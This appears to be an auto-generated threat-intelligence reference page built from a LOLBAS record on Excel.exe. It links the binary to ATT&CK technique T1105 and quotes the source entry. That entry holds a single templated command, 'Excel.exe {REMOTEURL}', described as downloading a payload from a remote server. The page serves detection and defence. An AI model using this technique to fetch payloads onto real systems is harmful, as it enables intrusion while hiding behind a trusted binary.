---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Excel.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `excel.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Excel.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Office binary

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/excel.md)
- Source verification: [source record](../../sources/lolbas/excel.exe.md)

## Aliases

- `Excel.exe`
- `excel.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: Excel.exe {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/excel.exe.md)

## Source Verification

[source record](../../sources/lolbas/excel.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@reegun21'
Person: Reegun J (OCBC Bank)
Author: Reegun J (OCBC Bank)
Commands:
- Category: Download
Command: Excel.exe {REMOTEURL}
Description: Downloads payload from remote server
```
